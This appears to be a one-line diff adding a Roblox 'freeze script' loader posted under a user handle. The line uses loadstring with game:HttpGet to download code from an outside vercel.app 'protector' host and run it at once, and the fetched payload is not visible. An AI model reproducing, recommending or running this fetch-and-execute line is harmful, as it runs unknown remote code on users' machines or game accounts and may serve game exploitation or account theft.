@@ -1,0 +1,1 @@
+@abundanciadineri:loadstring(game:HttpGet("https://orrxl4-protector.vercel.app/api/raw?id=44tj36x1"))()FREZZE SCRIPT
